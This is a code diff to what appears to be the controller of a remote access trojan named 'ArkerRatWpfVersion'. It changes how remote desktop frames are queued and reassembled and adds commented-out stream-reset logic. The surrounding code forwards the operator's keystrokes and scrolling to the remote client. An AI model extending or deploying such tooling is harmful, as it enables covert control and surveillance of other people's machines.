@@ -349,11 +349,15 @@ namespace ArkerRatWpfVersion
             }
 
             Buffer();
+            //ResetWhenTheDelayOfFramesIsToLarge();
+
             clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
             clientSession.remoteDesktopWindowIsAlreadyOpen = true;
             this.PreviewKeyDown += new KeyEventHandler(SendKeystrokesToClient);
             this.PreviewMouseWheel += new MouseWheelEventHandler(SendScrollToClient);
             remoteDesktopVideoFrame.Stretch = Stretch.Fill;
+
+
         }
 
         private async void SendScrollToClient(object sender, MouseWheelEventArgs e)
@@ -432,7 +436,9 @@ namespace ArkerRatWpfVersion
                while (!clientSession.source.IsCancellationRequested && clientSession.remoteDesktopWindowIsAlreadyOpen)
                {
                    string temp = string.Empty;
-                   if(frameQue.TryDequeue(out temp))
+                   frameQue.TryDequeue(out temp);
+
+                   if (!string.IsNullOrEmpty(temp))
                    {
                        ReceiveFrameChunk(temp);
                    }
@@ -444,7 +450,7 @@ namespace ArkerRatWpfVersion
         private MemoryStream _frameStream = new MemoryStream();
         public async void ReceiveFrameChunk(string frameChunk)
         {
-            if (frameChunk == "§RemoteDesktopFrameDone§")
+            if (frameChunk.Contains("§RemoteDesktopFrameDone§"))
             {
                 byte[] frameBytes = CombineFrameChunks();
                 _frameStream.SetLength(0); // Reset the stream
@@ -470,10 +476,48 @@ namespace ArkerRatWpfVersion
                 {
                     byte[] chunkBytes = Convert.FromBase64String(frameChunk);
                     await _frameStream.WriteAsync(chunkBytes, 0, chunkBytes.Length);
+
+                    //if (_frameStream.Length > 100000)
+                    //{
+                    //    var sendDataTask = clientSession.SendData("§RemoteDesktopStart§close§RemoteDesktopEnd§");
+                    //    sendDataTask.Wait();
+                    //    clientSession.remoteDesktopWindowIsAlreadyOpen = false;
+                    //    frameQue = new ConcurrentQueue<string>();
+                    //    _frameStream.SetLength(0);
+                    //    clientSession.data = string.Empty;
+                    //    var _sendDataTask = clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
+                    //    sendDataTask.Wait();
+                    //    clientSession.remoteDesktopWindowIsAlreadyOpen = true;
+                    //}
                 }
                 catch (Exception ex) { return; }
             }
         }
+
+        //private async Task ResetWhenTheDelayOfFramesIsToLarge()
+        //{
+        //    while (!clientSession.source.IsCancellationRequested && clientSession.remoteDesktopWindowIsAlreadyOpen)
+        //    {
+        //        string[] tempQue = frameQue.ToArray();
+        //        int length = 0;
+        //        foreach (var item in tempQue)
+        //        {
+        //            length += item.Length;
+        //        }
+        //        lock (GlobalVariables._lock)
+        //        {
+        //            if (length > 800000 || clientSession.data.Length > 800000)
+        //            {
+        //                var sendDataTask = clientSession.SendData("§RemoteDesktopStart§close§RemoteDesktopEnd§");
+        //                sendDataTask.Wait(); frameQue = new ConcurrentQueue<string>();
+        //                clientSession.data = string.Empty;
+        //                clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
+        //            }
+        //        }
+
+        //        await Task.Delay(3000);
+        //    }
+        //}
 
         private byte[] CombineFrameChunks()
         {
